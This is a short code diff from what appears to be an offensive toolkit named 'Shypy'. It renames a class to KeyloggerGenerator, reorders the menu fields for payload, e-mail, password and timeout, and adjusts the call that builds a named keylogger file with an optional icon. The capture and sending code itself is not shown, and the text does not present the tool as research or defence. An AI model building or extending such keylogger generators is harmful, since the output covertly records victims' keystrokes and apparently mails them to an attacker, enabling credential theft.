@@ -2,7 +2,7 @@ import importlib
 from ..utils.module_utils import *
 from ..variables.variables import *
 
-class Generator(ModuleUtils):
+class KeyloggerGenerator(ModuleUtils):
     """
     The Generator class is responsible for managing the keylogger generation process.
     It provides a command-line interface for setting up the necessary parameters and
@@ -44,19 +44,19 @@ class Generator(ModuleUtils):
             ║ "generate"                          : Generate a Keylogger.              ║
             ║ "back"                              : Back To Shypy.                     ║
             ╠═════════════════════════════════════╬════════════════════════════════════╣
-            ║*             Payload                : {COLOR['RESET']}{self.payload}{COLOR['CYAN']}{' ' * (35 - len(self.payload))}║                                             
-            ╠═════════════════════════════════════╬════════════════════════════════════╣
             ║*             E-Mail                 : {COLOR['RESET']}{self.mail}{COLOR['CYAN']}{' ' *  (35 - len(self.mail))}║
             ╠═════════════════════════════════════╬════════════════════════════════════╣
             ║*            Password                : {COLOR['RESET']}{self.password}{COLOR['CYAN']}{' ' *  (35 - len(self.password))}║
             ╠═════════════════════════════════════╬════════════════════════════════════╣
             ║*            Time Out                : {COLOR['RESET']}{self.time_out}{COLOR['CYAN']}{' ' *  (35 - len(self.time_out))}║
+            ╠═════════════════════════════════════╬════════════════════════════════════╣
+            ║*             Payload                : {COLOR['RESET']}{self.payload}{COLOR['CYAN']}{' ' * (35 - len(self.payload))}║                                             
             ╠═════════════════════════════════════╩════════════════════════════════════╣            
             ║*                               - The Shypy -                            *║ 
             ╚══════════════════════════════════════════════════════════════════════════╝
             \n\n""")
 
-        answer = input(f"{COLOR['CYAN']}ShyPy >>{COLOR['RESET']} ").lower().strip()
+        answer = input(f"{COLOR['CYAN']}Shypy >>{COLOR['RESET']} ").lower().strip()
 
         if answer.startswith("set mail"):
             try:
@@ -106,8 +106,8 @@ class Generator(ModuleUtils):
                 keylogger_name = input(f"{COLOR['GREEN']}[+]{COLOR['RESET']} The Name Of Keylogger: ") + ".py"
                 keylogger_icon = input(f"{COLOR['GREEN']}[+]{COLOR['RESET']} The Icon Of Keylogger (Optional): ")
                 
-                self.pipeline_a(
-                    module="keylogger", payload=self.payload, mail=self.mail, password=self.password,
+                self.pipeline(
+                    module="keylogger", payload=self.payload, mail=self.mail, password=self.password, 
                     timeout=int(self.time_out), name=keylogger_name, icon_path=keylogger_icon)
                 
                 sys.exit(1)
